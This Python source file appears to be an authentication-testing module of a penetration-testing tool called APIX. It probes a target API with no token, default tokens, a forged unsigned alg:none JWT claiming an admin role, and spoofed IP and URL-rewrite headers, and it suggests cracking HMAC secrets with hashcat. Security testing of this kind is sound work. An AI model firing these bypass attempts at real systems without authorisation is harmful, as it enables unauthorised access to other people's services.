#!/usr/bin/env python3
# modules/auth_test.py — API authentication security tester for APIX

import urllib.request
import urllib.error
import urllib.parse
import ssl
import json
import base64
from modules.base import BaseModule
from utils.colors import Colors, print_status, print_section


class AuthTester(BaseModule):

    NAME        = "api/auth"
    DESCRIPTION = "API authentication testing — JWT, broken auth, missing auth, token exposure"
    REFERENCES  = [
        "https://owasp.org/www-project-api-security/",
        "https://portswigger.net/web-security/jwt",
    ]

    def _define_options(self):
        self._add_option("TARGET",   "",     True,  "API endpoint URL to test")
        self._add_option("TOKEN",    "",     False, "JWT or Bearer token to analyze")
        self._add_option("TIMEOUT",  "8",    False, "Request timeout in seconds")
        self._add_option("METHOD",   "GET",  False, "HTTP method")

    def run(self) -> list:
        if not self._validate():
            return []

        target  = self.get_option("TARGET").strip()
        token   = self.get_option("TOKEN").strip()
        timeout = int(self.get_option("TIMEOUT") or 8)
        method  = self.get_option("METHOD").upper()

        print_section(f"API Auth Tester — {target}")
        findings = []

        # 1. Test without authentication
        findings += self._test_no_auth(target, method, timeout)

        # 2. Test with common weak tokens
        findings += self._test_weak_tokens(target, method, timeout)

        # 3. Analyze provided JWT
        if token:
            findings += self._analyze_jwt(token, target, method, timeout)

        # 4. Test common auth headers
        findings += self._test_auth_bypass(target, method, timeout)

        print()
        print_status(f"Auth test complete. {Colors.WHITE}{len(findings)}{Colors.RESET} finding(s).", "ok")
        return findings

    # ── No Auth ───────────────────────────────────────────────────

    def _test_no_auth(self, url, method, timeout) -> list:
        findings = []
        print_status("Testing endpoint without authentication...", "run")

        code, body, _ = self._request(url, method, timeout)

        if code in (200, 201, 204):
            print(f"  {Colors.RED}[HIGH]{Colors.RESET}   Endpoint accessible WITHOUT authentication (HTTP {code})")
            findings.append(self._finding("HIGH", "Missing Authentication",
                                          url, f"HTTP {code} returned without any auth token"))
        elif code == 401:
            print(f"  {Colors.GREEN}[OK]{Colors.RESET}     Endpoint requires authentication (HTTP 401)")
            findings.append(self._finding("OK", "Authentication Required", url, "HTTP 401"))
        elif code == 403:
            print(f"  {Colors.YELLOW}[LOW]{Colors.RESET}    HTTP 403 — may be IP-based restriction, not token-based")
            findings.append(self._finding("LOW", "Possible IP Restriction",
                                          url, f"HTTP 403 without token"))
        elif code == 0:
            print_status("Could not connect to endpoint.", "warn")
        else:
            print(f"  {Colors.DARK_GRAY}[INFO]{Colors.RESET}   HTTP {code} without auth")
            findings.append(self._finding("INFO", "No Auth Response", url, f"HTTP {code}"))

        return findings

    # ── Weak Tokens ───────────────────────────────────────────────

    def _test_weak_tokens(self, url, method, timeout) -> list:
        findings = []
        print_status("Testing common weak/default tokens...", "run")

        weak_tokens = [
            ("null token",        "null"),
            ("empty Bearer",      ""),
            ("test token",        "test"),
            ("admin token",       "admin"),
            ("undefined",         "undefined"),
            ("Bearer undefined",  "undefined"),
        ]

        weak_jwts = [
            ("alg:none JWT", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."),
            ("HS256 empty",  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0."),
        ]

        for label, token in weak_tokens + weak_jwts:
            hdrs = {"Authorization": f"Bearer {token}"} if token else {}
            code, body, _ = self._request(url, method, timeout, headers=hdrs)
            if code in (200, 201, 204):
                print(f"  {Colors.RED}[HIGH]{Colors.RESET}   Authenticated with {label} (HTTP {code})")
                findings.append(self._finding("HIGH", f"Weak Token Accepted: {label}",
                                              url, f"Token '{token[:30]}' returned HTTP {code}"))
            else:
                print(f"  {Colors.DARK_GRAY}[OK]{Colors.RESET}     {label} rejected (HTTP {code})")

        return findings

    # ── JWT Analysis ──────────────────────────────────────────────

    def _analyze_jwt(self, token: str, url, method, timeout) -> list:
        findings = []
        print_status("Analyzing JWT token...", "run")

        parts = token.split(".")
        if len(parts) != 3:
            print_status("Provided token is not a valid JWT (expected 3 parts).", "warn")
            return findings

        # Decode header and payload
        def b64_decode(s):
            s += "=" * (-len(s) % 4)
            try:
                return json.loads(base64.urlsafe_b64decode(s))
            except Exception:
                return {}

        header  = b64_decode(parts[0])
        payload = b64_decode(parts[1])

        print(f"\n  {Colors.BOLD}{Colors.WHITE}JWT Header{Colors.RESET}")
        for k, v in header.items():
            print(f"  {Colors.DARK_GRAY}{k:<12}{Colors.RESET}: {Colors.WHITE}{v}{Colors.RESET}")

        print(f"\n  {Colors.BOLD}{Colors.WHITE}JWT Payload{Colors.RESET}")
        for k, v in payload.items():
            print(f"  {Colors.DARK_GRAY}{k:<12}{Colors.RESET}: {Colors.WHITE}{v}{Colors.RESET}")

        # Check algorithm
        alg = header.get("alg", "").upper()
        if alg == "NONE" or alg == "":
            print(f"\n  {Colors.RED}[CRITICAL]{Colors.RESET} Algorithm is 'none' — signature bypass possible!")
            findings.append(self._finding("CRITICAL", "JWT alg:none",
                                          url, "JWT accepts unsigned tokens"))
        elif alg in ("HS256", "HS384", "HS512"):
            print(f"\n  {Colors.YELLOW}[MEDIUM]{Colors.RESET}  HMAC algorithm ({alg}) — check for weak secret")
            findings.append(self._finding("MEDIUM", f"JWT HMAC ({alg})",
                                          url, "Consider brute-forcing the secret with hashcat mode 16500"))
        elif alg in ("RS256", "RS384", "RS512"):
            print(f"\n  {Colors.GREEN}[OK]{Colors.RESET}     RSA algorithm ({alg})")
            findings.append(self._finding("OK", f"JWT RSA ({alg})", url))

        # Check expiry
        import time
        exp = payload.get("exp")
        if exp:
            remaining = int(exp) - int(time.time())
            if remaining < 0:
                print(f"  {Colors.RED}[HIGH]{Colors.RESET}   Token is EXPIRED ({abs(remaining)//3600}h ago)")
                findings.append(self._finding("HIGH", "JWT Expired",
                                              url, f"Expired {abs(remaining)//3600}h ago"))
            elif remaining > 86400 * 30:
                print(f"  {Colors.YELLOW}[LOW]{Colors.RESET}    Token expiry is very long ({remaining//86400} days)")
                findings.append(self._finding("LOW", "JWT Long Expiry",
                                              url, f"{remaining//86400} days remaining"))

        # Test alg:none bypass
        print_status("Testing alg:none bypass...", "run")
        none_header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
        none_payload = parts[1]
        none_token   = f"{none_header}.{none_payload}."
        code, _, _   = self._request(url, method, timeout,
                                     headers={"Authorization": f"Bearer {none_token}"})
        if code in (200, 201, 204):
            print(f"  {Colors.RED}[CRITICAL]{Colors.RESET} alg:none bypass SUCCESSFUL (HTTP {code})")
            findings.append(self._finding("CRITICAL", "JWT alg:none Bypass",
                                          url, f"Server accepted unsigned token (HTTP {code})"))
        else:
            print(f"  {Colors.GREEN}[OK]{Colors.RESET}     alg:none bypass rejected (HTTP {code})")

        print()
        return findings

    # ── Auth Header Bypass ────────────────────────────────────────

    def _test_auth_bypass(self, url, method, timeout) -> list:
        findings = []
        print_status("Testing authentication bypass headers...", "run")

        bypass_headers = [
            {"X-Original-URL":       "/admin"},
            {"X-Rewrite-URL":        "/admin"},
            {"X-Forwarded-For":      "127.0.0.1"},
            {"X-Real-IP":            "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP":     "127.0.0.1"},
            {"CF-Connecting-IP":     "127.0.0.1"},
            {"True-Client-IP":       "127.0.0.1"},
        ]

        for hdrs in bypass_headers:
            code, _, _ = self._request(url, method, timeout, headers=hdrs)
            header_name = list(hdrs.keys())[0]
            if code in (200, 201, 204):
                print(f"  {Colors.RED}[HIGH]{Colors.RESET}   {header_name} bypass worked (HTTP {code})")
                findings.append(self._finding("HIGH", f"Header Bypass: {header_name}",
                                              url, f"HTTP {code} returned with bypass header"))
            else:
                print(f"  {Colors.DARK_GRAY}[OK]{Colors.RESET}     {header_name} → {code}")

        return findings

    # ── HTTP helper ───────────────────────────────────────────────

    def _request(self, url, method, timeout, headers=None):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        default_headers = {"User-Agent": "APIX/1.0 (Security Assessment)"}
        if headers:
            default_headers.update(headers)
        try:
            req = urllib.request.Request(url, method=method, headers=default_headers)
            handler = urllib.request.HTTPSHandler(context=ctx)
            opener  = urllib.request.build_opener(handler)
            with opener.open(req, timeout=timeout) as resp:
                body = resp.read(1024*32).decode("utf-8", errors="replace")
                return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as e:
            body = ""
            try: body = e.read(1024*16).decode("utf-8", errors="replace")
            except: pass
            return e.code, body, dict(e.headers) if e.headers else {}
        except Exception:
            return 0, "", {}
